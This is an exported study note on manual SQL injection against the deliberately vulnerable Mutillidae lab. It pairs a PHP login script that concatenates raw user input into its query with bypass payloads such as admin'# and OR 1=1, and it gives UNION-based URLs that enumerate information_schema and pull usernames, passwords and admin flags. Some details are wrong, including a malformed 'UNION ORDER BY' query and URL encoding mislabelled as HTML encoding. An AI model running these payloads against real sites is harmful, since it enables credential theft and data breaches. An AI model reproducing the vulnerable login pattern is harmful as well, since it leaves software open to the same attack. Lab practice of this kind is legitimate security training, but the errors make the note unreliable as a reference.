<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>sql injection (manual)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>sql injection (manual)</h1><br/>PHP Example:<br /><br />&lt;?php<br />mysql_connect(&quot;localhost&quot;, &quot;db_username&quot;, &quot;db_password&quot;); # Connection to the SQL<br />Database.<br />mysql_select_db(&quot;users&quot;); # Database table where user information is stored.<br />$username=$_POST[&#39;username&#39;]; # User-specified username.<br />$password=$_POST[&#39;password&#39;]; #User-specified password.<br />$sql=&quot;SELECT * FROM users WHERE username=&#39;$username&#39; AND password=&#39;$password&#39;&quot;;<br /># Query for user/pass retrieval from the DB.<br />$result=mysql_query($sql);<br /># Performs query stored in $sql and stores it in $result.<br />$count=mysql_num_rows($result);<br /># Sets the $count variable to the number of rows stored in $result.<br />if ($count==1){<br /># Checks if there&#39;s at least 1 result, and if yes:<br />$_SESSION[&#39;username&#39;] = $username; # Creates a session with the specified $username.<br />$_SESSION[&#39;password&#39;] = $password; # Creates a session with the specified $password.<br />header(&quot;location:home.php&quot;); # Redirect to homepage.}<br />else { # If there&#39;s no singular result of a user/pass combination:<br />header(&quot;location:login.php&quot;);<br /># No redirection, as the login failed in the case the $count variable is not equal to<br />1, HTTP Response code 200 OK.<br />}<br />?&gt;<br /><br /><br />We can gain Foothold by using-----&gt; Username: admin&#39;# <br />As no input validation is made..It will comment out the password area like below. (Putting any password will do)<br /><br /><a href=""><img src="images/20-1.png" alt="images/20-1.png" /></a><br /><br /><br /><strong>Using Metaploitable2:::::</strong><br />SELECT * FROM demo;<br /><br />INSERT INTO demo (id, name, hint) VALUES (18, &quot;James&quot;, &quot;Guitar&quot;);<br /><br />DELETE FROM demo WHERE name = &quot;James&quot;;<br /><br />UPDATE demo SET id = 18 WHERE name = &quot;Atil&quot;;<br /><br />SELECT * FROM demo WHERE name LIKE &quot;%E&quot;;<br /><br />SELECT * FROM accounts WHERE username=&#39;james&#39; AND password=&#39;12345&#39;<br /><br />Testing Vulnerability:<br /><br />Given Password is Known:::::<br />Always Fail<br />SELECT * FROM accounts WHERE username=&#39;james&#39; AND password=&#39;12345&#39; AND 1=2#&#39;<br />Always Succeed<br />SELECT * FROM accounts WHERE username=&#39;james&#39; AND password=&#39;12345&#39; AND 1=1#&#39;<br /><br /><br />HTML Encoding of # is %23<br />HTML Encoding of SPACE is %20<br /><br /><br />Post Method Exploit:<br />Password is not known::::::<br />SELECT * FROM accounts WHERE username=&#39;james&#39; AND password=&#39;abc&#39; OR 1=1#&#39;<br />or<br />SELECT * FROM accounts WHERE username=&#39;james&#39;#&#39;<br /><br />Get Method Exploit:<br /><a href="http://10.10.10.104/mutillidae/index.php?page=user-info.php&username=james'%23&password=1234&user-info-php-submit-button=View+Account+Details">http://10.10.10.104/mutillidae/index.php?page=user-info.php&amp;username=james&#39;%23&amp;password=1234&amp;user-info-php-submit-button=View+Account+Details</a><br />Note: james&#39;# ----&gt; james&#39;%23<br /><br /><br />To see all Data of table use union (Use in Get Method to see the list)<br />SELECT * FROM accounts WHERE username=&#39;james&#39; UNION SELECT * FROM accounts #&#39;<br /><a href="http://10.10.10.104/mutillidae/index.php?page=user-info.php&username=admin'">http://10.10.10.104/mutillidae/index.php?page=user-info.php&amp;username=admin&#39;</a> UNION SELECT * FROM accounts%23&amp;password=1234&amp;user-info-php-submit-button=View+Account+Details<br /><br /><br /><a href="http://10.10.10.104/mutillidae/index.php?page=user-info.php&username=james%27%20union%20select%20*%20from%20accounts%23&password=1234&user-info-php-submit-button=View+Account+Details">http://10.10.10.104/mutillidae/index.php?page=user-info.php&amp;username=james%27%20union%20select%20*%20from%20accounts%23&amp;password=1234&amp;user-info-php-submit-button=View+Account+Details</a><br /><br /><br /><br />Suppose we do not know the Database Name:<br /><br />SELECT * FROM accounts WHERE username=&#39;james&#39; UNION ORDER BY 1#&#39;<br />SELECT * FROM accounts WHERE username=&#39;james&#39; UNION ORDER BY 2#&#39;<br />SELECT * FROM accounts WHERE username=&#39;james&#39; UNION ORDER BY 3#&#39;<br />SELECT * FROM accounts WHERE username=&#39;james&#39; UNION ORDER BY 4#&#39;<br />SELECT * FROM accounts WHERE username=&#39;james&#39; UNION ORDER BY 5#&#39;<br /><br />Try till you get an error to know the number of columns.<br />Then,<br />SELECT * FROM accounts WHERE username=&#39;james&#39; UNION SELECT 1, 2, 3, 4, 5#&#39;<br /><br />Once we know which columns have data, we search for default names:<br />SELECT * FROM accounts WHERE username=&#39;james&#39; UNION SELECT 1, database(), user(), version(), 5#&#39;<br />eg. <a href="http://10.10.10.104/mutillidae/index.php?page=user-info.php&username=james%27%20union%20select%201,%20database(),%20user(),%20version(),%205%23&password=1234&user-info-php-submit-button=View+Account+Details">http://10.10.10.104/mutillidae/index.php?page=user-info.php&amp;username=james%27%20union%20select%201,%20database(),%20user(),%20version(),%205%23&amp;password=1234&amp;user-info-php-submit-button=View+Account+Details</a><br /><br />Digging Deeper for tables:<br />SELECT * FROM accounts WHERE username=&#39;james&#39; UNION SELECT 1, table_name, null, null, 5 FROM information_schema.tables#&#39;<br /><a href="http://10.10.10.104/mutillidae/index.php?page=user-info.php&username=james%27%20union%20select%201,%20table_name,%20null,%20null,%205%20from%20information_schema.tables%23&password=1234&user-info-php-submit-button=View+Account+Details">http://10.10.10.104/mutillidae/index.php?page=user-info.php&amp;username=james%27%20union%20select%201,%20table_name,%20null,%20null,%205%20from%20information_schema.tables%23&amp;password=1234&amp;user-info-php-submit-button=View+Account+Details</a><br /><br />Getting Table names from Database(OWASP10):<br />SELECT * FROM accounts WHERE username=&#39;james&#39; UNION SELECT 1, table_name, null, null, 5 FROM information_schema.tables WHERE table_schema=&#39;OWASP10&#39;#&#39;<br /><a href="http://10.10.10.104/mutillidae/index.php?page=user-info.php&username=admin%27%20union%20select%201,%20table_name,%20null,%20null,%205%20from%20information_schema.tables%20where%20table_schema%20=%20%27OWASP10%27%23&password=1234&user-info-php-submit-button=View+Account+Details">http://10.10.10.104/mutillidae/index.php?page=user-info.php&amp;username=admin%27%20union%20select%201,%20table_name,%20null,%20null,%205%20from%20information_schema.tables%20where%20table_schema%20=%20%27OWASP10%27%23&amp;password=1234&amp;user-info-php-submit-button=View+Account+Details</a><br /><br /><br />Getting columns from Tables:<br />SELECT * FROM accounts WHERE username=&#39;james&#39; UNION SELECT 1, column_name, null, null, 5 FROM information_schema.columns WHERE table_name=&#39;accounts&#39;#&#39;<br /><br />Getting column values:<br />SELECT * FROM accounts WHERE username=&#39;james&#39; UNION SELECT 1, username, password, is_admin, 5 FROM accounts#&#39;</div>
</body>
</html>
